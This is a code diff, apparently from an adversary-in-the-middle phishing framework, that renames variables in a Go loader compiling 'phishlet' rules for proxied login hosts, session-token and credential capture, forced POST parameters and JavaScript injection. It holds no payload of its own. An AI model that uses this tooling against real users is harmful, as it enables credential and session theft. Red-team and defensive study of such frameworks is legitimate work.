@@ -113,41 +113,41 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 		})
 	}
 	var proxyHosts []aitm.ProxyHost
-	for i, ph := range raw.ProxyHosts {
+	for i, rawHost := range raw.ProxyHosts {
 		field := fmt.Sprintf("proxy_hosts[%d]", i)
-		if ph.PhishSub == "" {
+		if rawHost.PhishSub == "" {
 			errs = append(errs, ParseError{File: path, Field: field + ".phish_sub", Message: "required"})
 		}
-		if ph.OrigSub == "" {
+		if rawHost.OrigSub == "" {
 			errs = append(errs, ParseError{File: path, Field: field + ".orig_sub", Message: "required"})
 		}
-		if ph.Domain == "" {
+		if rawHost.Domain == "" {
 			errs = append(errs, ParseError{File: path, Field: field + ".domain", Message: "required"})
 		}
 		autoFilter := true
-		if ph.AutoFilter != nil {
-			autoFilter = *ph.AutoFilter
+		if rawHost.AutoFilter != nil {
+			autoFilter = *rawHost.AutoFilter
 		}
 		proxyHosts = append(proxyHosts, aitm.ProxyHost{
-			PhishSubdomain: substitute(ph.PhishSub, params),
-			OrigSubdomain:  substitute(ph.OrigSub, params),
-			Domain:         substitute(ph.Domain, params),
-			IsLanding:      ph.IsLanding,
-			IsSession:      ph.IsSession,
+			PhishSubdomain: substitute(rawHost.PhishSub, params),
+			OrigSubdomain:  substitute(rawHost.OrigSub, params),
+			Domain:         substitute(rawHost.Domain, params),
+			IsLanding:      rawHost.IsLanding,
+			IsSession:      rawHost.IsSession,
 			AutoFilter:     autoFilter,
 		})
 	}
 
 	// ── sub_filters ──────────────────────────────────────────────────────────
 	var subFilters []aitm.SubFilter
-	for i, sf := range raw.SubFilters {
+	for i, rawFilter := range raw.SubFilters {
 		field := fmt.Sprintf("sub_filters[%d]", i)
-		if sf.Search == "" {
+		if rawFilter.Search == "" {
 			errs = append(errs, ParseError{File: path, Field: field + ".search", Message: "required"})
 			continue
 		}
-		searchPattern := substitute(sf.Search, params)
-		re, compErr := regexp.Compile(searchPattern)
+		searchPattern := substitute(rawFilter.Search, params)
+		searchRegex, compErr := regexp.Compile(searchPattern)
 		if compErr != nil {
 			errs = append(errs, ParseError{
 				File:    path,
@@ -157,11 +157,11 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 			continue
 		}
 		subFilters = append(subFilters, aitm.SubFilter{
-			Hostname:   substitute(sf.Hostname, params),
-			MimeTypes:  sf.MimeTypes,
-			Search:     re,
-			Replace:    substitute(sf.Replace, params),
-			WithParams: sf.WithParams,
+			Hostname:   substitute(rawFilter.Hostname, params),
+			MimeTypes:  rawFilter.MimeTypes,
+			Search:     searchRegex,
+			Replace:    substitute(rawFilter.Replace, params),
+			WithParams: rawFilter.WithParams,
 		})
 	}
 
@@ -174,10 +174,10 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 		})
 	}
 	var authTokens []aitm.TokenRule
-	for i, at := range raw.AuthTokens {
+	for i, rawToken := range raw.AuthTokens {
 		field := fmt.Sprintf("auth_tokens[%d]", i)
 		tokenType := aitm.TokenTypeCookie
-		switch strings.ToLower(at.Type) {
+		switch strings.ToLower(rawToken.Type) {
 		case "", "cookie":
 			tokenType = aitm.TokenTypeCookie
 		case "body":
@@ -188,13 +188,13 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 			errs = append(errs, ParseError{
 				File:    path,
 				Field:   field + ".type",
-				Message: fmt.Sprintf("unknown token type %q; must be cookie, body, or header", at.Type),
+				Message: fmt.Sprintf("unknown token type %q; must be cookie, body, or header", rawToken.Type),
 			})
 		}
-		if at.Domain == "" {
+		if rawToken.Domain == "" {
 			errs = append(errs, ParseError{File: path, Field: field + ".domain", Message: "required"})
 		}
-		for j, key := range at.Keys {
+		for j, key := range rawToken.Keys {
 			kField := fmt.Sprintf("%s.keys[%d]", field, j)
 			if key.Name == "" {
 				errs = append(errs, ParseError{File: path, Field: kField + ".name", Message: "required"})
@@ -223,7 +223,7 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 			}
 			authTokens = append(authTokens, aitm.TokenRule{
 				Type:     tokenType,
-				Domain:   substitute(at.Domain, params),
+				Domain:   substitute(rawToken.Domain, params),
 				Name:     nameRe,
 				Search:   searchRe,
 				HTTPOnly: key.HTTPOnly,
@@ -238,13 +238,13 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 
 	// ── force_post ───────────────────────────────────────────────────────────
 	var forcePosts []aitm.ForcePost
-	for i, fp := range raw.ForcePosts {
+	for i, rawPost := range raw.ForcePosts {
 		field := fmt.Sprintf("force_post[%d]", i)
-		if fp.Path == "" {
+		if rawPost.Path == "" {
 			errs = append(errs, ParseError{File: path, Field: field + ".path", Message: "required"})
 			continue
 		}
-		pathRe, compErr := regexp.Compile(substitute(fp.Path, params))
+		pathRe, compErr := regexp.Compile(substitute(rawPost.Path, params))
 		if compErr != nil {
 			errs = append(errs, ParseError{
 				File:    path,
@@ -254,23 +254,23 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 			continue
 		}
 		var conds []aitm.ForcePostCondition
-		for j, c := range fp.Conditions {
+		for j, condition := range rawPost.Conditions {
 			cField := fmt.Sprintf("%s.conditions[%d]", field, j)
-			keyRe, err := mustCompile(c.Key, path, cField+".key", &errs)
+			keyRe, err := mustCompile(condition.Key, path, cField+".key", &errs)
 			if err != nil {
 				continue
 			}
-			searchRe, err := mustCompile(c.Search, path, cField+".search", &errs)
+			searchRe, err := mustCompile(condition.Search, path, cField+".search", &errs)
 			if err != nil {
 				continue
 			}
 			conds = append(conds, aitm.ForcePostCondition{Key: keyRe, Search: searchRe})
 		}
 		var fparams []aitm.ForcePostParam
-		for _, p := range fp.Params {
+		for _, param := range rawPost.Params {
 			fparams = append(fparams, aitm.ForcePostParam{
-				Key:   substitute(p.Key, params),
-				Value: substitute(p.Value, params),
+				Key:   substitute(param.Key, params),
+				Value: substitute(param.Value, params),
 			})
 		}
 		forcePosts = append(forcePosts, aitm.ForcePost{
@@ -282,13 +282,13 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 
 	// ── intercept ────────────────────────────────────────────────────────────
 	var intercepts []aitm.InterceptRule
-	for i, ic := range raw.Intercepts {
+	for i, rawIntercept := range raw.Intercepts {
 		field := fmt.Sprintf("intercept[%d]", i)
-		if ic.Path == "" {
+		if rawIntercept.Path == "" {
 			errs = append(errs, ParseError{File: path, Field: field + ".path", Message: "required"})
 			continue
 		}
-		pathRe, compErr := regexp.Compile(substitute(ic.Path, params))
+		pathRe, compErr := regexp.Compile(substitute(rawIntercept.Path, params))
 		if compErr != nil {
 			errs = append(errs, ParseError{
 				File:    path,
@@ -298,8 +298,8 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 			continue
 		}
 		var bodyRe *regexp.Regexp
-		if ic.BodySearch != "" {
-			bodyRe, compErr = regexp.Compile(substitute(ic.BodySearch, params))
+		if rawIntercept.BodySearch != "" {
+			bodyRe, compErr = regexp.Compile(substitute(rawIntercept.BodySearch, params))
 			if compErr != nil {
 				errs = append(errs, ParseError{
 					File:    path,
@@ -309,26 +309,26 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 				continue
 			}
 		}
-		if ic.Status == 0 {
+		if rawIntercept.Status == 0 {
 			errs = append(errs, ParseError{File: path, Field: field + ".status", Message: "required"})
 		}
 		intercepts = append(intercepts, aitm.InterceptRule{
 			Path:        pathRe,
 			BodySearch:  bodyRe,
-			StatusCode:  ic.Status,
-			ContentType: substitute(ic.ContentType, params),
-			Body:        substitute(ic.Body, params),
+			StatusCode:  rawIntercept.Status,
+			ContentType: substitute(rawIntercept.ContentType, params),
+			Body:        substitute(rawIntercept.Body, params),
 		})
 	}
 
 	// ── js_inject ────────────────────────────────────────────────────────────
 	var jsInjects []aitm.JSInject
-	for i, ji := range raw.JSInjects {
+	for i, rawJSInject := range raw.JSInjects {
 		field := fmt.Sprintf("js_inject[%d]", i)
 		var triggerPathRe *regexp.Regexp
-		if ji.TriggerPath != "" {
+		if rawJSInject.TriggerPath != "" {
 			var compErr error
-			triggerPathRe, compErr = regexp.Compile(substitute(ji.TriggerPath, params))
+			triggerPathRe, compErr = regexp.Compile(substitute(rawJSInject.TriggerPath, params))
 			if compErr != nil {
 				errs = append(errs, ParseError{
 					File:    path,
@@ -339,9 +339,9 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 			}
 		}
 		jsInjects = append(jsInjects, aitm.JSInject{
-			TriggerDomain: substitute(ji.TriggerDomain, params),
+			TriggerDomain: substitute(rawJSInject.TriggerDomain, params),
 			TriggerPath:   triggerPathRe,
-			Script:        substitute(ji.Script, params),
+			Script:        substitute(rawJSInject.Script, params),
 		})
 	}
 
@@ -404,20 +404,20 @@ func (l *Loader) compileCredentials(path string, raw rawCredentials, params map[
 
 	var rules aitm.CredentialRules
 
-	if cr, ok := compileRule("credentials.username", raw.Username); ok {
-		rules.Username = cr
+	if compiledRule, ok := compileRule("credentials.username", raw.Username); ok {
+		rules.Username = compiledRule
 	}
-	if cr, ok := compileRule("credentials.password", raw.Password); ok {
-		rules.Password = cr
+	if compiledRule, ok := compileRule("credentials.password", raw.Password); ok {
+		rules.Password = compiledRule
 	}
-	for i, c := range raw.Custom {
+	for i, custom := range raw.Custom {
 		field := fmt.Sprintf("credentials.custom[%d]", i)
-		if c.Name == "" {
+		if custom.Name == "" {
 			errs = append(errs, ParseError{File: path, Field: field + ".name", Message: "required"})
 			continue
 		}
-		if cr, ok := compileRule(field, c.rawCredRule); ok {
-			rules.Custom = append(rules.Custom, aitm.CustomCredentialRule{Name: c.Name, CredentialRule: cr})
+		if compiledRule, ok := compileRule(field, custom.rawCredRule); ok {
+			rules.Custom = append(rules.Custom, aitm.CustomCredentialRule{Name: custom.Name, CredentialRule: compiledRule})
 		}
 	}
 
@@ -432,8 +432,8 @@ func substitute(s string, params map[string]string) string {
 		return s
 	}
 	result := s
-	for k, v := range params {
-		result = strings.ReplaceAll(result, "{"+k+"}", v)
+	for key, value := range params {
+		result = strings.ReplaceAll(result, "{"+key+"}", value)
 	}
 	return result
 }
@@ -441,7 +441,7 @@ func substitute(s string, params map[string]string) string {
 // mustCompile compiles pattern as a regex, appending a ParseError to errs on
 // failure and returning a non-nil error. On success, err is nil.
 func mustCompile(pattern, file, field string, errs *ParseErrors) (*regexp.Regexp, error) {
-	re, err := regexp.Compile(pattern)
+	compiled, err := regexp.Compile(pattern)
 	if err != nil {
 		*errs = append(*errs, ParseError{
 			File:    file,
@@ -450,5 +450,5 @@ func mustCompile(pattern, file, field string, errs *ParseErrors) (*regexp.Regexp
 		})
 		return nil, err
 	}
-	return re, nil
+	return compiled, nil
 }
